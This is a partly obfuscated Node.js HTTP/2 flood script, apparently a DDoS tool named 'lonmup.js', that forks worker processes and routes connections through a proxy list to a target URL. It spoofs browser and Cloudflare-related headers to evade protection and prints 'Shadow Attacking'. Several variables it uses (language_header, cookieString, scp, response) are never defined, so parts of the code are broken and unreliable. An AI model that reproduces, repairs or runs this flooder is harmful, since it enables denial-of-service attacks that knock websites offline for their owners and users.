process.on("uncaughtException", function (_0x4f1fe1) {});
process.on("unhandledRejection", function (_0x5856dd) {});
process.on("SIGHUP", () => {
  return 1;
});
process.on("SIGCHILD", () => {
  return 1;
});
require("events").EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);

const cluster = require("cluster"),
      crypto = require("crypto"),
      http2 = require("http2"),
      net = require("net"),
      tls = require("tls"),
      url = require("url"),
      fs = require("fs");

var path = require("path"),
    fileName = __filename;

process.argv.length < 7 && (console.log("node lonmup.js <url> <time> <requests> <threads> <proxy>".rainbow), process.exit());
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":"),
      ciphers = "GREASE:" + [defaultCiphers[2], defaultCiphers[1], defaultCiphers[0], defaultCiphers.slice(3)].join(":"),
      sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512",
      ecdhCurve = "GREASE:x25519:secp256r1:secp384r1",
      secureOptions = crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_TLSv1 | crypto.constants.SSL_OP_NO_TLSv1_1 | crypto.constants.ALPN_ENABLED | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE | crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT | crypto.constants.SSL_OP_COOKIE_EXCHANGE | crypto.constants.SSL_OP_PKCS1_CHECK_1 | crypto.constants.SSL_OP_PKCS1_CHECK_2 | crypto.constants.SSL_OP_SINGLE_DH_USE | crypto.constants.SSL_OP_SINGLE_ECDH_USE | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION,
      secureProtocol = "TLS_method",
      secureContextOptions = {
  "ciphers": ciphers,
  "sigalgs": sigalgs,
  "honorCipherOrder": true,
  "secureOptions": secureOptions,
  "secureProtocol": secureProtocol
},
      secureContext = tls.createSecureContext(secureContextOptions),
      headers = {};

function readLines(_0x27737e) {
  return fs.readFileSync(_0x27737e, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(_0xf58daf, _0xdece2a) {
  return Math.floor(Math.random() * (_0xdece2a - _0xf58daf) + _0xf58daf);
}

function randomElement(_0xa2d15c) {
  return _0xa2d15c[randomIntn(0, _0xa2d15c.length)];
}

function randomCharacters(_0x1d47c8) {
  output = "";

  for (let _0x3f8c16 = 0; _0x3f8c16 < _0x1d47c8; _0x3f8c16++) {
    output += randomElement(characters);
  }

  return output;
}

const args = {
  "target": process.argv[2],
  "time": process.argv[3],
  "rate": process.argv[4],
  "threads": process.argv[5],
  "proxy": process.argv[6]
},
      accept_header = ["*/*", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8", "application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*", "text/html, application/xhtml+xml, image/jxr, */*", "text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1", "application/javascript, */*;q=0.8", "text/html, text/plain; q=0.6, */*; q=0.1", "application/graphql, application/json; q=0.8, application/xml; q=0.7", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel"],
      platform = ["Windows", "Macintosh", "Linux", "Android", "PlayStation 4", "iPhone", "iPad", "Windows Phone",, "iOS", "Android", "PlayStation 5", "Xbox One", "Nintendo Switch", "Apple TV", "Amazon Fire TV", "Roku", "Chromecast", "Smart TV", "Other"],
      cache_header = ["max-age=0", "no-cache", "no-store", "must-revalidate", "proxy-revalidate", "s-maxage=604800", "no-cache, no-store,private, max-age=0, must-revalidate", "no-cache, no-store,private, s-maxage=604800, must-revalidate", "no-cache, no-store,private, max-age=604800, must-revalidate", "no-transform", "only-if-cached", "max-age=0", "max-age=120", "max-age=600578", "must-revalidate", "public", "private", "proxy-revalidate", "*/*", "max-age=604800", "max-age=0, private, must-revalidate", "private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0", "no-cache, no-store, max-age=0, must-revalidate", "no-store, no-cache, must-revalidate", "public, max-age=0, s-maxage=3600, must-revalidate, stale-while-revalidate=28800"],
      type = ["text/plain", "text/html", "application/json", "application/xml", "multipart/form-data", "application/octet-stream", "image/jpeg", "image/png", "audio/mpeg", "video/mp4", "application/javascript", "application/pdf", "application/vnd.ms-excel", "application/vnd.ms-powerpoint", "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet", "application/vnd.openxmlformats-officedocument.presentationml.presentation", "application/vnd.openxmlformats-officedocument.wordprocessingml.document", "application/zip", "image/gif", "image/bmp", "image/tiff", "audio/wav", "audio/midi", "video/avi", "video/mpeg", "video/quicktime", "text/csv", "text/xml", "text/css", "text/javascript", "application/graphql", "application/x-www-form-urlencoded", "application/vnd.api+json", "application/ld+json", "application/x-pkcs12", "application/x-pkcs7-certificates", "application/x-pkcs7-certreqresp", "application/x-pem-file", "application/x-x509-ca-cert", "application/x-x509-user-cert", "application/x-x509-server-cert", "application/x-bzip", "application/x-gzip", "application/x-7z-compressed", "application/x-rar-compressed", "application/x-shockwave-flash"];
dest_header = ["audio", "audioworklet", "document", "embed", "empty", "font", "frame", "iframe", "image", "manifest", "object", "paintworklet", "report", "script", "serviceworker", "sharedworker", "subresource", "unknown", "style", "track", "video", "worker", "xslt"];
mode_header = ["cors", "navigate", "no-cors", "same-origin", "websocket"];
site_header = ["cross-site", "same-origin", "same-site", "none"];
encoding_header = ["deflate, gzip;q=1.0, *;q=0.5", "gzip, deflate, br", "gzip, deflate", "*"];
var proxies = readLines(args.proxy);
const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
  for (let i = 0; i < process.argv[5]; i++) {
    cluster.fork();
  }

  console.clear();
  console.log("Shadow Attacking ???".rainbow);
  setTimeout(() => {}, process.argv[5] * 1000);

  for (let counter = 1; counter <= args.threads; counter++) {
    cluster.fork();
  }
} else setInterval(runFlooder);

class NetSocket {
  constructor() {}

  ["HTTP"](_0x4afc25, _0x19ea17) {
    const _0x1af3f4 = _0x4afc25.address.split(":"),
          _0x45321a = "CONNECT " + _0x4afc25.address + ":443 HTTP/1.1\r\nHost: " + _0x4afc25.address + ":443\r\nConnection: Keep-Alive\r\n\r\n",
          _0x527f5f = new Buffer.from(_0x45321a),
          _0x5956d8 = net.connect({
      "host": _0x4afc25.host,
      "port": _0x4afc25.port,
      "allowHalfOpen": true,
      "writable": true,
      "readable": true
    });

    _0x5956d8.setTimeout(_0x4afc25.timeout * 20000);

    _0x5956d8.setKeepAlive(true, 20000);

    _0x5956d8.setNoDelay(true);

    _0x5956d8.on("connect", () => {
      _0x5956d8.write(_0x527f5f);
    });

    _0x5956d8.on("data", _0x1d46c6 => {
      const _0x4e9dde = _0x1d46c6.toString("utf-8"),
            _0x45f0f1 = _0x4e9dde.includes("HTTP/1.1 200");

      if (_0x45f0f1 === false) return _0x5956d8.destroy(), _0x19ea17(undefined, "403");
      return _0x19ea17(_0x5956d8, undefined);
    });

    _0x5956d8.on("timeout", () => {
      return _0x5956d8.destroy(), _0x19ea17(undefined, "403");
    });

    _0x5956d8.on("error", _0x3cbfcd => {
      return _0x5956d8.destroy(), _0x19ea17(undefined, "403");
    });
  }

}

function getRandomUserAgent() {
  const _0x3611db = ["Windows NT 10.0", "Windows NT 6.1", "Windows NT 6.3", "Macintosh", "Android", "Linux"],
        _0x3ab3aa = ["Chrome", "Firefox", "Safari", "Edge", "Opera"],
        _0x47d71a = ["en-US", "en-GB", "fr-FR", "de-DE", "es-ES"],
        _0x50311c = ["US", "GB", "FR", "DE", "ES"],
        _0x480e1f = ["Apple", "Google", "Microsoft", "Mozilla", "Opera Software"],
        _0x31396e = _0x3611db[Math.floor(Math.random() * _0x3611db.length)],
        _0x103975 = _0x3ab3aa[Math.floor(Math.random() * _0x3ab3aa.length)],
        _0x37c42c = _0x47d71a[Math.floor(Math.random() * _0x47d71a.length)],
        _0x22521e = _0x50311c[Math.floor(Math.random() * _0x50311c.length)],
        _0x4426d4 = _0x480e1f[Math.floor(Math.random() * _0x480e1f.length)],
        _0x158781 = Math.floor(Math.random() * 100) + 1,
        _0x153ad7 = Math.floor(Math.random() * 6) + 1,
        _0x5c575d = _0x4426d4 + "/" + _0x103975 + " " + _0x158781 + "." + _0x158781 + "." + _0x158781 + " (" + _0x31396e + "; " + _0x22521e + "; " + _0x37c42c + ")",
        _0x119019 = btoa(_0x5c575d);

  let _0x1d782e = "";

  for (let _0x88e6f7 = 0; _0x88e6f7 < _0x119019.length; _0x88e6f7++) {
    _0x88e6f7 % _0x153ad7 === 0 ? _0x1d782e += _0x119019.charAt(_0x88e6f7) : _0x1d782e += _0x119019.charAt(_0x88e6f7).toUpperCase();
  }

  return _0x1d782e;
}

const Socker = new NetSocket();
headers[":method"] = "GET";
headers[":path"] = parsedTarget.path;
headers[":scheme"] = parsedTarget.protocol == "https:" ? "https" : "http";
headers.accept = accept_header[Math.floor(Math.random() * accept_header.length)];
headers["accept-encoding"] = encoding_header[Math.floor(Math.random() * encoding_header.length)];
headers["accept-language"] = language_header[Math.floor(Math.random() * language_header.length)];
headers["cache-control"] = cache_header[Math.floor(Math.random() * cache_header.length)];
headers.pragma = "no-cache";
headers["sec-ch-ua"] = getRandomUserAgent();
headers["cf-cache-status"] = "DYNAMIC";
headers.referer = parsedTarget.host;
headers.priority = "u=0, 1";
headers.origin = parsedTarget.protocol + "//" + parsedTarget.host;
headers["cdn-loop"] = "cloudflare";
headers["sec-ch-ua-mobile"] = "?0";
headers["sec-ch-ua-platform"] = platform[Math.floor(Math.random() * platform.length)];
headers["sec-fetch-dest"] = dest_header[Math.floor(Math.random() * dest_header.length)];
headers["sec-fetch-mode"] = mode_header[Math.floor(Math.random() * mode_header.length)];
headers["sec-fetch-site"] = site_header[Math.floor(Math.random() * site_header.length)];
headers["sec-fetch-user"] = "?1";
headers["upgrade-insecure-requests"] = "1";
headers["user-agent"] = getRandomUserAgent();
headers["x-requested-with"] = "XMLHttpRequest";
headers["sec-gpc"] = Math.random() < 0.5 ? "1" : "1";
headers.cookie = cookieString(scp.parse(response["set-cookie"]));
headers["content-type"] = type[Math.floor(Math.random() * type.length)];
headers.TE = "trailers";
headers.dnt = "1";

function runFlooder() {
  const _0x261683 = randomElement(proxies),
        _0x38b1ac = _0x261683.split(":");

  headers[":authority"] = parsedTarget.host;
  headers["x-forwarded-for"] = _0x38b1ac[0];
  headers["x-forwarded-proto"] = "https";
  const _0x3ed158 = {
    "host": _0x38b1ac[0],
    "port": _0x38b1ac[1],
    "address": parsedTarget.host + ":443",
    "timeout": 100
  };
  Socker.HTTP(_0x3ed158, (_0x262dbd, _0x21e4fd) => {
    if (_0x21e4fd) return;

    _0x262dbd.setKeepAlive(true, 100000);

    _0x262dbd.setNoDelay(true);

    const _0x3a3749 = {
      "enablePush": false,
      "initialWindowSize": 1073741823
    },
          _0xe79ae3 = {
      "port": 443,
      "ALPNProtocols": ["h2", "spdy/3.1", "http/1.1", "h3", "http/2+quic/43", "http/2+quic/44", "http/2+quic/45"],
      "secure": true,
      "ciphers": ciphers,
      "sigalgs": sigalgs,
      "requestCert": true,
      "challengeToSolve": Infinity,
      "socket": _0x262dbd,
      "ecdhCurve": ecdhCurve,
      "honorCipherOrder": false,
      "cloudflareTimeout": Infinity,
      "cloudflareMaxTimeout": Infinity,
      "maxRedirects": Infinity,
      "rejectUnauthorized": false,
      "servername": url.hostname,
      "decodeEmails": false,
      "host": parsedTarget.host,
      "servername": parsedTarget.host,
      "secureOptions": secureOptions,
      "secureContext": secureContext,
      "secureProtocol": secureProtocol
    },
          _0x430d9d = tls.connect(443, parsedTarget.host, _0xe79ae3);

    _0x430d9d.allowHalfOpen = true;

    _0x430d9d.setNoDelay(true);

    _0x430d9d.setKeepAlive(true, 60 * 100000);

    _0x430d9d.setMaxListeners(0);

    const _0x5917e7 = http2.connect(parsedTarget.href, {
      "protocol": "https:",
      "settings": {
        "headerTableSize": 65536,
        "maxConcurrentStreams": 1000,
        "initialWindowSize": 6291456,
        "maxHeaderListSize": 262144,
        "enablePush": false
      },
      "maxSessionMemory": 3333,
      "maxDeflateDynamicTableSize": 4294967295,
      "createConnection": () => _0x430d9d,
      "socket": _0x262dbd
    });

    _0x5917e7.settings({
      "headerTableSize": 65536,
      "maxConcurrentStreams": 1000,
      "initialWindowSize": 6291456,
      "maxHeaderListSize": 262144,
      "enablePush": false
    });

    _0x5917e7.setMaxListeners(0);

    _0x5917e7.settings(_0x3a3749);

    _0x5917e7.on("connect", () => {});

    _0x5917e7.on("close", () => {
      _0x5917e7.destroy();

      _0x262dbd.destroy();

      return;
    });

    _0x5917e7.on("error", _0x43f9d2 => {
      _0x5917e7.destroy();

      _0x262dbd.destroy();

      return;
    });
  });
}

const KillScript = () => process.exit();

setTimeout(KillScript, args.time * 1000);